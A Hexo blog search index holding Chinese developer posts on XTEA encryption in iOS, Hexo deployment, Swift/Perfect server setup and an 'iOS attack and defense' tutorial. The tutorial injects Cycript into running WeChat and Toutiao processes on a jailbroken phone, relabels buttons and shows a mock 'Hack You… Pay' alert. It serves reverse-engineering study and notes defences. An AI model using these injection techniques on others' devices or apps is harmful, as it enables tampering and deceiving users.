<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[记一次iOS使用XTEA微型加密算法]]></title>
    <url>%2Farchives%2Fd3400f8e.html</url>
    <content type="text"><![CDATA[许多年后有一股寒风，从我自以为火热温暖的从未被寒冷侵入的内心深处阵阵袭来时，我才发现穿再厚的棉衣也没用了。生命本身有一个冬天，它已经来临。 ——刘亮程《寒风吹彻》 简介 在密码学中，微型加密算法（Tiny Encryption Algorithm，TEA）是一种易于描述和执行的块密码，通常只需要很少的代码就可实现。其设计者是剑桥大学计算机实验室的大卫·惠勒与罗杰·尼达姆。这项技术最初于1994年提交给鲁汶的快速软件加密的研讨会上，并在该研讨会上演讲中首次发表。 在给出的代码中：加密使用的数据为2个32位无符号整数，密钥为4个32位无符号整数即密钥长度为128位 正文关于加密算法 加密算法虽然我们可能不是非常了解底层原理，但是在现在信息安全的年代，工作中也会经常需要用的，比如： 非对称加密的：RSA、ECC（移动设备用）、DSA（数字签名用） 对称加密的：AES，DES Hash算法的：MD2、MD4、MD5、HAVAL、SHA、SHA-1、HMAC、HMAC-MD5、HMAC-SHA1 有时候我们可能会遇到这种情况：因为数据长度有限制，需要加密后的数据长度尽可能的短。比如如果给蓝牙的广播数据加一次密做单向的校验。但是在iOS开发中，自定义广播的数据长度是有限的，总共可用的才31个字节，再除去蓝牙字段名称、长度、蓝牙名称的实际值、自定义字段名称及长度等等，实际上可以给我们自定义使用的部分那真的是少的可怜。 但是又不能将全部的广播包数据都加密，因为苹果会先将广播数据按照协议解析完成之后，将里面的少部分数据封装成对象抛给上层供我们使用，如果整个广播包加密会导致我们无法获取到广播数据，所以就只能单独的加密自定义广播部分的数据。 在这里就不能使用RSA了，因为性能比较低、加解密比较慢；AES这样的算法又对数据长度有要求，最低都需要16个字节；Hash算法又不可逆，无法获取原始数据。最终在技术经理的提议下，使用了一种叫XTEA的算法，XTEA是TEA的升级版，增加了更多的密钥表，移位和异或操作等等。 XTEA加密过程 iOS使用 算法实现源码是使用C语言写的，虽然iOS可以直接调用C函数，但是直接调用总感觉很别扭，所以就将该算法直接以分类的方式简单封装一下，需要用到的小伙伴可以直接使用，因为一共就没多少行代码，直接贴代码了： 直接给NSData添加一个XTEA算法的分类，.h文件如下： 12345678910111213141516171819/** 加密数据 @param data 需要加密的数据 (8字节) @param keyData 加密的Key (16字节) @param rounds 循环次数 @return 加密过的数据 (8字节) */+ (NSData *)encryptData:(NSData *)data key:(NSData *)keyData rounds:(unsigned int)rounds;/** 解密数据 @param data 需要解密的数据 (8字节) @param keyData 解密的key (16字节) @param rounds 循环次数 @return 解密过的数据 (8字节) */+ (NSData *)decryptData:(NSData *)data key:(NSData *)keyData rounds:(unsigned int)rounds; .m文件如下： 注意引入需要的头文件 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495// 引入必要的头文件#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;// 声明常量static NSInteger const kUint32DataCount = 2;static NSInteger const kUint32KeyCount = 4;static NSInteger const kSubdataLength = 4;void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) &#123; unsigned int i; uint32_t v0=v[0], v1=v[1], sum=0, delta=0x9E3779B9; for (i=0; i &lt; num_rounds; i++) &#123; v0 += (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]); sum += delta; v1 += (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum&gt;&gt;11) &amp; 3]); &#125; v[0]=v0; v[1]=v1;&#125;void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) &#123; unsigned int i; uint32_t v0=v[0], v1=v[1], delta=0x9E3779B9, sum=delta*num_rounds; for (i=0; i &lt; num_rounds; i++) &#123; v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum&gt;&gt;11) &amp; 3]); sum -= delta; v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]); &#125; v[0] = v0; v[1] = v1;&#125;/** 加密数据 @param data 需要加密的数据 (8字节) @param keyData 加密的Key (16字节) @param rounds 循环次数 @return 加密过的数据 (8字节) */+ (NSData *)encryptData:(NSData *)data key:(NSData *)keyData rounds:(unsigned int)rounds&#123; NSAssert(data.length == 8, @&quot;encryptData: (data length != 8)&quot;); NSAssert(keyData.length == 16, @&quot;encryptData: (keyData length != 16)&quot;); // 将数据拆分成2个uint32_t数组 uint32_t encryptData[kUint32DataCount]; for (int i = 0; i &lt; kUint32DataCount; i++) &#123; encryptData[i] = [NSData uint32FromData:[data subdataWithRange:NSMakeRange(i * kSubdataLength, kSubdataLength)]]; &#125; // 将Key拆成4个uint32_t数组 uint32_t key[kUint32KeyCount]; for (int i = 0; i &lt; kUint32KeyCount; i++) &#123; key[i] = [NSData uint32FromData:[keyData subdataWithRange:NSMakeRange(i * kSubdataLength, kSubdataLength)]]; &#125; // 加密 encipher(rounds, encryptData, key); // 返回结果 return [NSData dataFromUInt32Array:encryptData length:data.length];&#125;/** 解密数据 @param data 需要解密的数据 (8字节) @param keyData 解密的key (16字节) @param rounds 循环次数 @return 解密过的数据 (8字节) */+ (NSData *)decryptData:(NSData *)data key:(NSData *)keyData rounds:(unsigned int)rounds&#123; NSAssert(data.length == 8, @&quot;decryptData: (data length != 8)&quot;); NSAssert(keyData.length == 16, @&quot;decryptData: (keyData length != 16)&quot;); // 将数据拆分成2个uint32_t数组 uint32_t decryptData[kUint32DataCount]; for (int i = 0; i &lt; kUint32DataCount; i++) &#123; decryptData[i] = [NSData uint32FromData:[data subdataWithRange:NSMakeRange(i * kSubdataLength, kSubdataLength)]]; &#125; // 将Key拆成4个uint32_t数组 uint32_t key[kUint32KeyCount]; for (int i = 0; i &lt; kUint32KeyCount; i++) &#123; key[i] = [NSData uint32FromData:[keyData subdataWithRange:NSMakeRange(i * kSubdataLength, kSubdataLength)]]; &#125; // 解密 decipher(rounds, decryptData, key); // 返回结果 return [NSData dataFromUInt32Array:decryptData length:data.length];&#125; 使用到的数据转换 NSData 转 uint32 uint32 转 NSData 12345678910111213141516+ (uint32_t)uint32FromData:(NSData *)hexData&#123; NSAssert(hexData.length == 4, @&quot;uint32FromData: (data length != 4)&quot;); Byte dataBytes[4]; [hexData getBytes:&amp;dataBytes length:4]; uint32_t resultValue = *(uint32_t *)dataBytes ; return resultValue;&#125;+ (NSData *)dataFromUInt32Array:(uint32_t *)value length:(NSInteger)length&#123; Byte *result = (Byte *)value; return [NSData dataWithBytes:result length:length];&#125; 参考 常用加密算法概述 TEA、XTEA、XXTEA加密解密算法]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>XTEA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记一次Hexo博客部署缓慢的解决办法]]></title>
    <url>%2Farchives%2F8e3becb8.html</url>
    <content type="text"><![CDATA[况且，一个人要活的真实就难免不把别人的一生当一场戏。看不见的岁月是可怕的。 ——刘亮程《一个人的村庄》 简介 本来之前也有想把博客的图片放在七牛的服务器上做成外链的，但是去注册发现需要实名认证，所以就放弃折腾了；而且我的博客目前来说还很小，所以图片也就直接在本地压缩下就使用了。 最近一次写博客用的图片比较多，然后当时也忘记压缩了，所以就导致使用hexo d提交部署的时候一直不见成功，中间提交、等待、取消、重试，来来回回折腾好多次也没见成功，以为是连接GitHub比较慢，所以挂梯子，依然如故… 思考 &amp; 解决思考 既然使用terminal部署文件比较大时比较慢，那么此时就需要换一种方法去部署更新了。 我们在编辑完文章使用hexo g生成命令的时候，实际上，是将我们的Markdown格式文件重新生成对应的静态HTML网页格式的文件，并且和相关的图片素材一起放在博客的根目录的public目录下。 同时public目录下也会生成我们的站点主题配置、样式、SEO优化、站点地图、百度蜘蛛爬取配置等等的我们在网站所能访问到的任何文件和资源。 我们在执行hexo clean命令时候，实际上清空的也是这个目录下的所有文件。 当我们开始hexo d提交部署的时候，实际上就是把public目录下的所有的文件上传到GitHub服务器上面，这样我们的静态网站就可以访问到我们新编辑的内容了。 解决 既然我们的博客站点访问的文件都是存放在GitHub上面的静态文件，而这些静态文件又都是在本地每次生成在public目录下的，那么我们就可以使用GitHub Desktop客户端，像我们管理自己的GitHub仓库一样来管理网站的仓库了。 首先使用GitHub Desktop客户端或者其他你喜欢的方式，将你网站的仓库拉到本地： 可以对比网站的仓库文件和博客public目录下的文件是一毛一样的，只是多了一个管理文件的.git目录。 此时我们再部署网站就可以通过下面的步骤完成: 使用hexo g生成博客的静态文件 将public目录下的所有文件拷贝到我们拉取到本地的博客站点文件内，替换博客站点目录内所有文件。 使用GitHub Desktop提交博客站点目录内的变动文件即可。 这里如果想和博客的GitHub仓库的提交记录保持一致：只需要将提交的Commit信息按Site updated: 2018-08-30 17:17:25这个格式写就可以了。 刷新网页就会发现已经部署成功，可以正常访问新编辑的内容了。 总结 本方案可以用于临时需要部署比较大的文件导致比较慢的部署情况。 如果可能，还是尽量使用图片外链的方式，博客的访问速度和体验也会提升。]]></content>
      <categories>
        <category>整理</category>
      </categories>
      <tags>
        <tag>Blog</tag>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS攻防（六）：使用Cycript一窥运行程序的神秘面纱(入门篇)]]></title>
    <url>%2Farchives%2Fc12f47b1.html</url>
    <content type="text"><![CDATA[从那个夜晚我懂得了隐藏温暖——在凛冽的寒风中，身体中那点温暖节俭地用于此后多年的爱情和生活。我的亲人说我是个很冷的人，不是的，我把仅有的温暖全给了你们。 ——刘亮程《寒风吹彻》 简介 Cycript allows developers to explore and modify running applications on either iOS or Mac OS X using a hybrid of Objective-C++ and JavaScript syntax through an interactive console that features syntax highlighting and tab completion.(It also runs standalone on Android and Linux and provides access to Java, but without injection.) Cycript是由Cydia创始人Saurik推出的一款脚本语言，Cycript 混合了Objective-C与javascript语法的解释器，这意味着我们能够在一个命令中用Objective-C或者javascript，甚至两者兼用。 它能够注入正在运行的进程，能够在运行时修改应用的很多东西。 cycript官网 了解更多： iOS攻防（一）： iPhone手机越狱 &amp; SSH iOS攻防（二）：窃取用户的通讯录信息 &amp; 偷窥用户安装应用列表 &amp; Netcat使用 iOS攻防（三）：配置使用Reveal工具逆向别人的App UI界面 iOS攻防（四）：使用Dumpdecrypted 砸壳 &amp; class-dump 导出头文件 iOS攻防（五）：使用Keychain-Dumper导出keychain数据 Cycript安装 安装Cycript有两种方式（手机需越狱）： 方式一：直接在Cydia搜索Cycript安装，简单方便。 方式二：通过Linux包管理器安装： 首先在手机上Cydia搜索安装 APT 0.6 Transitional包管理工具。 使用Terminal（如果手机有安装）或者电脑SSH连接手机，通过包管理器安装apt-get install cycript。 终端输入cycript，出现 cy#提示符，说明已经成功启动了Cycript（需要SSH连接手机）。 如果想要退出Cycript和断开远程登录： Control + D快捷键可以退出Cycript 终端输入logout可以断开手机远程登录 Cycript基本用法测试Cycript注入头条新闻 开始使用Cycript，注入一个正在运行（需要再前台）的程序。这里我们以今日头条为例。 首先使用电脑终端通过SSH连接到手机，不知道如何使用SSH的请参考之前的文章，这里不再赘述。 获取今日头条app的进程ID，建议清空后台应用，只保留需要hook的App在前台即可。 News即为今日头条进程名称，如果想知道某个app在运行时候的进程名称，可以下载对应的应用安装包，解压缩找到Payload目录下的xxx.app，其中xxx包名即是进程名称，如微信是WeChat，网易云音乐是NeteaseMusic。 在运行的进程中查找过滤我们需要的进程名称，命名如下： 1ps -e | grep News 成功之后，就可以看到今日头条应用进程的一些信息，如进程ID9347，进程的可执行文件路径等待。 拿到进程ID后，我们就可以注入住这个进程，从而对应用为所欲为了😈，如何注入进程，命令如下： 12cycript -p 9347 // 需要hook的程序打开到前台// cycript -p News 此时，我们可以简单测下下是否hook成功： 12[[UIApplication sharedApplication] setStatusBarHidden:YES] // 隐藏状态栏[[UIApplication sharedApplication] setStatusBarHidden:NO] // 显示状态栏 常用数据类型及类型判断 常用的数据类型（字符串、数组、字典、Bool， NSNumber）和我们在OC中使用的完全一样。 类型判断使用instanceof，如： 123456cy# @&quot;Hello World&quot; instanceof Stringtruecy# @[1, 2, 3] instanceof Arraytruecy# @&quot;Hello World&quot; instanceof Arrayfalse 字符串及数组截取 字符串及数组截取操作，分别使用substr和slice。 下标从x开始截取y个长度。 1234cy# @&quot;Hello World&quot;.substr(0, 5)&quot;Hello&quot;cy# @[1, 2, 3].slice(0, 2)[@1, @2] 创建及获取对象 注入程序后，我们可以根据需要创建需要用到的对象，或者根据内存地址获取到内存中的对象。 创建对象和OC语法差别不大。 根据内存地址获取对象，我们可以使用# 或者使用Instance。 123456// 创建对象var view = [[UIView alloc] init][new UIView init]// 获取对象#0x1719f9a0var same = new Instance(0x1719f9a0) 获取对象信息 方法1： 简单基本获取方法。 直接在对象前面加个* 1*controller（） 方法2：方法一无法获取，就使用方法2 1[i for (i in *UIApp)] 方法3：建议方法三，方法三能获取到更多 1function tryPrintIvars(a)&#123; var x=&#123;&#125;; for(i in *a)&#123; try&#123; x[i] = (*a)[i]; &#125; catch(e)&#123;&#125; &#125; return x; &#125; 类与增加分类 类定义及使用 12345@implementation MyClass : NSObject &#123; int num;&#125;-(int)returnNum &#123;return this -&gt; num;&#125;@end 增加分类 123456789// 定义@implementation NSObject (TestCategory) - description &#123;return &quot;test&quot;&#125; - (double)calculate:(float)num &#123;return num * 10;&#125;@end// 创建对象test = [new NSObject init]// 调用分类方法[test calculate:10] Block12345// 定义一个blockcy# testBlock = ^ int (int value) &#123;return value * 10&#125;// 调用cy# testBlock(7) 查找内存中的类信息 使用choose()函数可以查找到内存中对应传递进去的类，如查找今日头条首页中的图片控件choose(UIImageView) 输入信息如下（数据太多删除一部分），此时我们就可以通过UIImageView控件的内存地址获取到实例对象，修改对象的各种信息等等。 1[#&quot;&lt;UIImageView: 0x17112950; frame = (7.5 10; 11 6); clipsToBounds = YES; opaque = NO; userInteractionEnabled = NO; layer = &lt;CALayer: 0x17393410&gt;&gt;&quot;,#&quot;&lt;UIImageView: 0x17114090; frame = (0 0; 0 0); clipsToBounds = YES; opaque = NO; userInteractionEnabled = NO; layer = &lt;CALayer: 0x1736a500&gt;&gt;&quot;,#&quot;&lt;UIImageView: 0x171160a0; frame = (-5 0; 5 0); clipsToBounds = YES; opaque = NO; userInteractionEnabled = NO; layer = &lt;CALayer: 0x1736a4d0&gt;&gt;&quot;,#&quot;&lt;UIImageView: 0x17138d60; frame = (314.5 -39; 2.5 36); alpha = 0; opaque = NO; autoresize = LM; userInteractionEnabled = NO; layer = &lt;CALayer: 0x17145ad0&gt;&gt;&quot;,#&quot;&lt;SSThemedImageView: 0x1713b090; baseClass = UIImageView; frame = (0 0; 0 0); hidden = YES; opaque = NO; gestureRecognizers = &lt;NSArray: 0x1713b380&gt;; layer = &lt;CALayer: 0x17136fb0&gt;&gt;&quot;,......&quot;,#&quot;&lt;SSThemedImageView: 0x171687b0; baseClass = UIImageV 打印视图层次结构 如果我们想知道某个视图的层次结构信息，也可以不使用Reveal，使用下面指令查看整个层次的结构信息： 1UIApp.keyWindow.recursiveDescription().toString() 获取某个类的所有内容 我们可以打印出某个类的所有内容信息： 定义执行下面的函数 定义后就可以获取指定类的信息，调用printMethods(className, isa) 12345678910111213141516function printMethods(className, isa) &#123; var count = new new Type(&quot;I&quot;); var classObj = (isa != undefined) ? objc_getClass(className)-&gt;isa : objc_getClass(className); var methods = class_copyMethodList(classObj, count); var methodsArray = []; for(var i = 0; i &lt; *count; i++) &#123; var method = methods[i]; methodsArray.push(&#123;selector:method_getName(method), implementation:method_getImplementation(method)&#125;); &#125; free(methods); return methodsArray;&#125;printMethods(&quot;UIImageView&quot;, true)printMethods(&quot;TTArticleTabBarController&quot;, true) 获取当前控制器 可以直接打印可见控制器，如果获取不到可用下面的方法 1UIApp.keyWindow.rootViewController.visibleViewController 也打印出当前控制器名称及内存地址 定义执行下面的函数 调用函数var vc = currentVC()，如输出信息#&quot;&lt;TTArticleTabBarController: 0x17a5bc00&gt;&quot; 12345678910function currentVC() &#123; var app = [UIApplication sharedApplication] var keyWindow = app.keyWindow var rootController = keyWindow.rootViewController var visibleController = rootController.visibleViewController if (!visibleController) &#123; return rootController &#125; return visibleController.childViewControllers[0]&#125; 加载系统动态库 定义执行下面获取系统动态库的函数 定义好后就可以调用函数如loadFramework(&quot;UIKit&quot;)，传递想要加载的框架名称加载对应的框架。 12345function loadFramework(fw) &#123; var h=&quot;/System/Library/&quot;,t=&quot;Frameworks/&quot;+fw+&quot;.framework&quot;; [[NSBundle bundleWithPath:h+t]|| [NSBundle bundleWithPath:h+&quot;Private&quot;+t] load];&#125; NSLog打印函数123456789NSLog_ = dlsym(RTLD_DEFAULT, &quot;NSLog&quot;)NSLog = function() &#123; var types = &apos;v&apos;, args = [], count = arguments.length; for (var i = 0; i != count; ++i) &#123; types += &apos;@&apos;; args.push(arguments[i]); &#125; new Functor(NSLog_, types).apply(null, args);&#125; CG…Make函数123cy# function CGPointMake(x, y) &#123; return &#123;x:x, y:y&#125;; &#125;cy# function CGSizeMake(w, h) &#123; return &#123;width:w, height:h&#125;; &#125;cy# function CGRectMake(x, y, w, h) &#123; return &#123;origin:CGPointMake(x,y), size:CGSizeake(w, h)&#125;; &#125; 使用Cycript一窥微信 这里综合上面的知识练练手： 修改微信登录界面按钮文字及背景颜色 在登录界面弹出一个Alert弹框 修改微信登录界面背景图片 注入进程 获取微信的进程ID，使用Cycript注入微信进程。 123ps -e | grep WeChatcycript -p WeChat// cycript -p 进程ID // 替换为你的微信进程ID 层次结构 查看微信登录界面的层次结构 1UIApp.keyWindow.recursiveDescription().toString() 输出的层次结构信息： 123456789101112131415`&lt;iConsoleWindow: 0x14f6e420; baseClass = UIWindow; frame = (0 0; 320 568); gestureRecognizers = &lt;NSArray: 0x14f6dea0&gt;; layer = &lt;UIWindowLayer: 0x14f6e7a0&gt;&gt; | &lt;UILayoutContainerView: 0x14e10510; frame = (0 0; 320 568); autoresize = W+H; gestureRecognizers = &lt;NSArray: 0x14e0cd60&gt;; layer = &lt;CALayer: 0x14e103d0&gt;&gt; | | &lt;UINavigationTransitionView: 0x14e0d370; frame = (0 0; 320 568); clipsToBounds = YES; autoresize = W+H; layer = &lt;CALayer: 0x14e0ddd0&gt;&gt; | | | &lt;UIViewControllerWrapperView: 0x14f312e0; frame = (0 0; 320 568); autoresize = W+H; layer = &lt;CALayer: 0x14f31220&gt;&gt; | | | | &lt;UIView: 0x14e15e80; frame = (0 0; 320 568); autoresize = W+H; layer = &lt;CALayer: 0x14ef6410&gt;&gt; | | | | | &lt;UIView: 0x160ce380; frame = (0 20; 320 633); autoresize = W; layer = &lt;CALayer: 0x160c5110&gt;&gt; | | | | | | &lt;UIImageView: 0x14f2bef0; frame = (0 -20; 320 568); opaque = NO; userInteractionEnabled = NO; layer = &lt;CALayer: 0x14f2bff0&gt;&gt; | | | | | &lt;UIView: 0x160ce5b0; frame = (0 483; 320 65); autoresize = W+TM; layer = &lt;CALayer: 0x160ce690&gt;&gt; | | | | | | &lt;FixTitleColorButton: 0x160ce750; baseClass = UIButton; frame = (20 18; 130 47); clipsToBounds = YES; opaque = NO; autoresize = RM; layer = &lt;CALayer: 0x14f2c140&gt;&gt; | | | | | | | &lt;UIButtonLabel: 0x160ce980; frame = (46.5 13; 37 21.5); text = '\u767b\u5f55'; opaque = NO; userInteractionEnabled = NO; layer = &lt;_UILabelLayer: 0x160ceae0&gt;&gt; | | | | | | | | &lt;_UILabelContentLayer: 0x160cfc90&gt; (layer) | | | | | | &lt;FixTitleColorButton: 0x160ced10; baseClass = UIButton; frame = (170 18; 130 47); clipsToBounds = YES; opaque = NO; autoresize = LM; layer = &lt;CALayer: 0x160ceeb0&gt;&gt; | | | | | | | &lt;UIButtonLabel: 0x14f2c5f0; frame = (46.5 13; 37 21.5); text = '\u6ce8\u518c'; opaque = NO; userInteractionEnabled = NO; layer = &lt;_UILabelLayer: 0x14f2c750&gt;&gt; | | | | | | | | &lt;_UILabelContentLayer: 0x160d0cd0&gt; (layer) | | Command + F 搜索UIButton，可以找到有两个UIButton对象，并且text属性是显示的Unicode编码（中文在里面显示的就是Unicode字符编码）。我们可以在在线的Unicode和中文互转网站转换一下，如这个网站，可以看到对应的刚好就是界面上显示的登录和注册。 我们就可以拿到每一个的对应的按钮对象，改变按钮显示文字： 如我拿到的登录按钮内存地址：0x19c87130 注册按钮内存地址：0x19cd4470 注意设置中文时需要将中文转为Unicode编码。 12#0x19c87130.titleLabel.text = @&quot;\u52ab\u8d22&quot; // \u52ab\u8d22 == &quot;劫财&quot;#0x19cd4470.titleLabel.text = @&quot;\u52ab\u8272&quot; // \u52ab\u8272 == &quot;劫色&quot; 修改按钮文字背景颜色： 我们搜索上一步获取到的层次结构信息，可以找到叫UIButtonLabel的对象，修改按钮文字背景就是修改UIButtonLabel的背景颜色 只需要根据UIButtonLabel地址修改即可 12#0x15f4f590.backgroundColor = [UIColor redColor]#0x15f4ffb0.backgroundColor = [UIColor greenColor] 弹出一个Alert弹框 如果对方法签名不熟悉，可以在Xcode中打出来后拷贝进终端 尽量不要有中文和表情 也可以在系统桌面弹出，需要注入到系统的桌面进程SBHomeScreenWindow 12var alert = [[UIAlertView alloc] initWithTitle:@&quot;Hack You&quot; message:@&quot;I&apos;ve hacked you&quot; delegate:nil cancelButtonTitle:@&quot;No pay&quot; otherButtonTitles:@&quot;Pay&quot;, nil];[alert show]; 修改微信登录界面背景图片 如果我们想替换微信的某个图片，这里以登录界面背景为例子，只需要将我们自己的图片放在微信的某个目录下，如Document下，然后修改背景图片控件的图片即可。 将图片放入对应的文档目录下： 可以直接使用工具iMazing，也可以使用scp命令远程传输（越狱第一篇文章SS部分），看个人爱好。 获取微信的文档目录路径地址： 123456789101112131415cy# [[NSFileManager defaultManager] URLsForDirectory:NSDocumentDirectory inDomains:NSUserDomainMask][0]// 输出文档目录路径地址 #"file:///var/mobile/Containers/Data/Application/8B12B9B9-06BE-49C2-ADC2-96BB1C4F5E79/Documents/" // 图片加载路径地址 /var/mobile/Containers/Data/Application/8B12B9B9-06BE-49C2-ADC2-96BB1C4F5E79/Documents/``` - 在层次结构信息中查找`UIImageView`即为背景图片控件，根据内存地址获取到图片对象，然后重新设置图片: - 如我获取到的图片控件内存地址是`0x14706110` - 我放在文档目录的替换图片为`wechat_testBg.jpg````object-c #0x14706110.image = [UIImage imageWithContentsOfFile:@"/var/mobile/Containers/Data/Application/8B12B9B9-06BE-49C2-ADC2-96BB1C4F5E79/Docments/wechat_testBg.jpg"] 综合效果图（没修改文字背景颜色） 其他好玩的大家可以自行测试： 12345678910111213141516// 截屏cy# var shot = [SBScreenShotter sharedInstance]cy# [shot saveScreenshot:YES]// 隐藏桌面cy# UIApp.keyWindow // 获取SBHomeScreenWindow对象地址，SBHomeScreenWindow就是桌面Windowcy# screen = #0xxxxxxxxxx(上一步获取到的内存地址) cy# screen.hidden = YES // 隐藏cy# screen.hidden = NO // 显示// 改变手机的背景色cy# screen.backgroundColor = [UIColor redColor]// 设置badgecy# [[UIApplication sharedApplication] setApplicationIconBadgeNumber:100] 福利 如果感觉上面一些函数比较复杂，不想每次都去敲一次，那么福利来了，MJRefresh作者将一些Cycript实现的一些实用函数封装成一个脚本放在GitHub上面，基本上囊括了我们上面的那些，还有一些其他的比较常用的函数。 需要的小伙伴们可以直接去在这里下载，至于如何使用大家看文档就可以了，比较简单，都是中文就没必要我在转述一遍了。 防 通过一系列文章的介绍及实战，可以看到我们的App面临的安全问题是多么的可怕，也意识到保护app数据的重要性。 但是既然知道了这么多可能导致不安全的点，就要做好相应的防，保护重要数据不被攻击者使用Cycript或者Runtime修改，这里有一篇文章对如何防范介绍的很详细，大家可以参考下。 参考 Cycript Manual iOS逆向-用Cycript进行运行时分析(微信应用) iOS逆向工程（4）Cycript脚本语言使用与实战]]></content>
      <categories>
        <category>iOS</category>
        <category>攻防</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>攻防</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Swift开发服务端（三）：Perfect再次初体验]]></title>
    <url>%2Farchives%2Ff7d447dc.html</url>
    <content type="text"><![CDATA[多少年后当眼前的一切成为结局，时间改变了我，改变了村里的一切。整个老掉的一代人，坐在黄昏里感叹岁月流逝、沧桑巨变。没人知道有些东西是被我改变的。在时间经过这个小村庄的时候，我帮了时间的忙，让该变的一切都有了变迁。我老的时候，我会说：我是在时光中老的。 ——刘亮程《一个人的村庄》 简介 Perfect是一组完整、强大的工具箱、软件框架体系和Web应用服务器，可以在Linux和macOS (OS X)上使用。该软件体系为Swift工程师量身定制了一整套用于开发轻量、易维护、规模可扩展的Web应用及其它REST服务的解决方案，这样Swift工程师就可以实现同时在服务器和客户端上采用同一种语言开发软件项目。 由于建立在一个高性能异步网络引擎基础上，Perfect还能够在FastCGI上运行，支持安全套接字加密（SSL）。该软件体系还包含很多其它互联网服务器所需要的特点，包括WebSockets和iOS消息推送，而且很快会有更多强大的功能支持。 Swift开发服务端（一）：MySQL安装及配置 Swift开发服务端（二）：使用Parallels Desktop虚拟机安装Ubuntu系统及相关配置 正文 有很多小伙伴肯定在想，我为什么会把第一次给了Perfect🌝，那是因为Perfect有官方中文文档，虽然不是非常完善的中文文档，但有胜于无，减少了入门的难度。 什么，为什么叫再次初体验。那是因为上次的初体验不算。为什么不算、因为我说的🌚🌚。 本篇完全基于Mac系统，为什么不基于上一篇安装的Ubuntu系统呢，因为相较于Mac，在Ubuntu下只是多了Swift安装环境配置和其他需要的服务安装，都特别简单，更重要的是我们需要使用到Xcode进行编码、编译。 Perfect官方文档在这里 Ubuntu安装Swift 关于在Ubuntu系统下载安装Swift，参考Swift官方文档，已经介绍的非常详细了。 如果你不想看英文官方文档，好吧，那我就再总结（复制）一下： 安装Git 首先检查系统有没有安装Git，如果没有安装，直接使用包管理器安装： 1sudo apt-get install git 安装Swift依赖组件 确保您的系统上的包管理器是最新的： 1sudo apt-get update 安装Swift必要的依赖组件，如clang和Python等。 openssh-server 我们在安装Ubuntu一章中已经安装过，所以不用重复安装了。 1sudo apt-get install clang libicu-dev libpython2.7 安装Swift 下载最新的Swift二进制文件，可以手动下载，也可以使用wget下载。 根据自己的Ubuntu系统版本和需要的swift版本选择，在这里下载。 .tar.gz后缀的是工具链二进制文件 .sig 后缀的是数字签名文件。 1wget https://swift.org/builds/swift-4.0-release/ubuntu1604/swift-4.0-RELEASE/swift-4.0-RELEASE-ubuntu16.04.tar.gz 如果你是第一次下载安装Swift包，需要将Swift的PGP密钥导入您的密钥环，密钥将用于验证下载的文件有无被被损坏或篡改。 123456gpg --keyserver hkp://pool.sks-keyservers.net \ --recv-keys \ '7463 A81A 4B2E EA1B 551F FBCF D441 C977 412B 37AD' \ '1BE1 E29A 084C B305 F397 D62A 9F59 7F4D 21A5 6D5F' \ 'A3BA FD35 56A5 9079 C068 94BD 63BC 1CFE 91D3 06C6' \ '5E4D F843 FB06 5D7F 7E24 FBA2 EF54 30F0 71E1 B235' 导入密钥之后，下载对应Swift版本的签名文件： 1wget https://swift.org/builds/swift-4.0-release/ubuntu1604/swift-4.0-RELEASE/swift-4.0-RELEASE-ubuntu16.04.tar.gz.sig 验证签名文件： 如果出现警告信息，可忽略；如果出现错误信息，就需要重新下载Swift二进制文件。 1gpg --verify swift-4.0-RELEASE-ubuntu16.04.tar.gz.sig 安装完成密钥和签名文件，现在就可以安装Swift。 执行以下命令来提取之前下载的二进制文件： 1tar xzf swift-4.0-RELEASE-ubuntu16.04.tar.gz 将Swift工具链添加到环境变量中，以便运行swift命令： 1export PATH=swift-4.0-RELEASE-ubuntu16.04/usr/bin:"$&#123;PATH&#125;" 这个命令只会将swift命令添加到当前shell会话路径中，如果要确保它在以后的会话中自动添加，要将其添加到.bashrc文件中。 打开 .bashrc 文件 文件尾部添加环境变量 保存退出 12vi ~/.bashrc // 也可以使用nanoexport PATH=swift-4.0-RELEASE-ubuntu16.04/usr/bin:"$&#123;PATH&#125;" 在终端输入swift，如果输出Welcome to Apple Swift version xxx则表示安装swift成功。 Perfect服务端使用工具新建Perfect项目 想体验一个新技术，最简便的方法莫过于GUI工具，简单的点几下就可以运行起来。 Perfect Assistant专门用于服务器端Swift应用的启动、管理、编译、测试和部署，极大简化了上述工作的操作过程。无论是初次接触服务器的Swift程序员还是企业级的服务器Swift高级工程师，相信都可以从中受益。 使用Perfect搭建服务端之所以比较强大的原因之一：提供了可视化的工具帮助快速入门体验一个服务端软件的搭建。 而且她不仅支持自家的Perfect库，还支持另一个Swift服务端开发库Vapor。 更更更加支持新款MBP的Touch Bar，，恩，我的还是不支持Touch Bar的15款的MBP🌚。 Perfect Assistant 功能 新建Swift服务器工程，或者从现有项目模板中新建工程 管理组件依存关系 同步交叉编译——即在您的mac计算机上同步编译同一个服务器应用在macOS和Ubuntu操作系统上的二进制程序 配置亚马逊弹性计算或者谷歌云应用 将项目部署为亚马逊EC2弹性云计算服务器例程，或者谷歌云应用引擎服务器例程 下载Perfect Assistant 官方下载地址在这里 点击下载、安装即可。（注意需要科学上网，否则可能很慢） 安装完成后打开界面如下： 关于docker Perfect Assistant是支持使用docker进行编译和部署到Linux上的，安装docker后就可以在本地对代码进行linux环境的编译后直接部署到linux服务器上。 更重要的是：使用docker可以打包应用以及依赖包到一个可移植的容器中，然后发布到任何流行的Linux机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口。以后需要其他linux上部署，只需要将制作好的docker镜像拉取下来就可以运行，不需要再配置环境和依赖。 